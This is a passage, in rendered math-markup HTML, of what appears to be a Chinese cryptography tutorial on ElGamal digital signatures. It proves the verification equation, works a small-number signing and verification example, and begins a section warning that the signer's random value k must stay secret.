class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span></span></span>在模p下是否相等，如果相等，则验证通过。</li></ol><p>在正常情况下两者就是相等的，这里简单证明一下。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>β</mi><mi>x</mi></msup><mo>=</mo><msup><mi>g</mi><mrow><mi>a</mi><mi>x</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\beta^x=g^{ax}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mi>y</mi></msup><mo>=</mo><msup><mi>g</mi><mrow><mi>k</mi><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mi>a</mi><mi>x</mi><mo stretchy="false">)</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow></msup><mo>=</mo><msup><mi>g</mi><mrow><mi>m</mi><mo>−</mo><mi>a</mi><mi>x</mi></mrow></msup></mrow><annotation encoding="application/x-tex">x^y=g^{k(m-ax)k^{-1}}=g^{m-ax}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1813599999999997em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999998em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">m</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">x</span><span class="mclose mtight">)</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9657709999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span></span>。</p><p>两者一乘就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>g</mi><mi>m</mi></msup></mrow><annotation encoding="application/x-tex">g^m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span></span></span></span>啦！</p><h3 id="elgamal签名-例子"><a class="markdownIt-Anchor" href="#elgamal签名-例子"></a> Elgamal签名 例子</h3><ol><li><p>假设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>=</mo><mn>11</mn><mo separator="true">,</mo><mi>g</mi><mo>=</mo><mn>2</mn><mo separator="true">,</mo><mi>a</mi><mo>=</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">p=11,g=2,a=8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span></p></li><li><p>计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi><mo>=</mo><msup><mi>g</mi><mi>a</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>11</mn><mo stretchy="false">)</mo><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">\beta=g^a(mod\ p)=2^8(mod\ 11)=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span></p></li><li><p>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><mi>g</mi><mo separator="true">,</mo><mi>β</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>11</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p,g,\beta)=(11,2,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span>为公钥，私钥为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>=</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">a=8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span></p></li><li><p>现在对明文<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">m=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>进行签名</p><p>假设选择的随机数k为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>9</mn></mrow><annotation encoding="application/x-tex">9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">9</span></span></span></span>，因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mn>9</mn><mo separator="true">,</mo><mn>10</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd(9,10)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mclose">)</span></span></span></span>互素，符合条件</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mo>=</mo><msup><mn>2</mn><mn>9</mn></msup><mo>=</mo><mn>6</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mn>11</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x=g^k=2^9=6\ mod(11)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">6</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mi>a</mi><mi>x</mi><mo stretchy="false">)</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mn>10</mn><mo stretchy="false">)</mo><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">y=(m-ax)k^{-1}\ mod(10)=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span></p><p>则签名<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s=(x,y)=(6,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span></p></li><li><p>收信方收到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m,x,y)=(5,6,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span>，现开始进行验证。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>g</mi><mi>m</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>2</mn><mn>5</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mn>11</mn><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">g^m(mod\ p)=2^5\ mod(11)=-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>β</mi><mi>x</mi></msup><mo>=</mo><msup><mn>3</mn><mn>6</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mn>11</mn><mo stretchy="false">)</mo><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">\beta^x=3^6\ mod(11)=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mi>y</mi></msup><mo>=</mo><msup><mn>6</mn><mn>3</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mn>11</mn><mo stretchy="false">)</mo><mo>=</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">x^y=6^3\ mod(11)=7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span></p><p>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>β</mi><mi>x</mi></msup><msup><mi>x</mi><mi>y</mi></msup><mo>=</mo><mn>21</mn><mo>=</mo><mo>−</mo><mn>1</mn><mo>=</mo><msup><mi>g</mi><mi>m</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mn>11</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\beta^xx^y=21=-1=g^m\ mod(11)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>验证成功。</p></li></ol><h3 id="elgamal签名-注意点"><a class="markdownIt-Anchor" href="#elgamal签名-注意点"></a> Elgamal签名 注意点</h3><ol><li><p>签名人用的k绝对不能泄露。</p><p>因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mi>a</mi><mi>x</mi><mo stretchy="false">)</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">y=(m-ax)k^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" 